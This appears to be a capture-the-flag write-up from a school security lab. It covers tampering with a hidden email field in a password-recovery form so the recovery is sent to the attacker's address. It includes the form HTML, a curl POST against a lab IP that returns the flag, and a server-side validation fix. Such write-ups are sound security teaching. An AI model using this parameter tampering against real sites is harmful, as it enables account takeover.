# B06-CustomRequest-PasswordRecover

## BREACH

PATH `http://192.168.56.110/?page=recover`

From the main page, we can log in, there is a button `I forgot my password`.

By clicking on it, we arrive on a page that seems to send a recovery email.

Inspecting the code, we see that there is an email address in clear in the page's code. By replacing it with our own email address, we can assume that the site will send us an email that will allow us to gain access.


```
<form action="#" method="POST">
	<input type="hidden" name="mail" value="webmaster@borntosec.com" maxlength="15">
	<input type="submit" name="Submit" value="Submit">
</form>
```

We can then make a request with curl by sending a form containing our email address.

```
➜  Darkly git:(main) ✗ curl -X POST http://192.168.x.x/\?page\=recover -d "mail=lgiband@student.42.fr&Submit=Submit" | grep "flag"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2634    0  2595  100    39  1267k  19500 --:--:-- --:--:-- --:--:-- 1286k
<center><h2 style="margin-top:50px;"> The flag is : 1d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center>
```

## PATCH

Do not trust the front end, rely on backend data to send an email by asking the user to enter their email address and verifying if an account is associated with it, for example.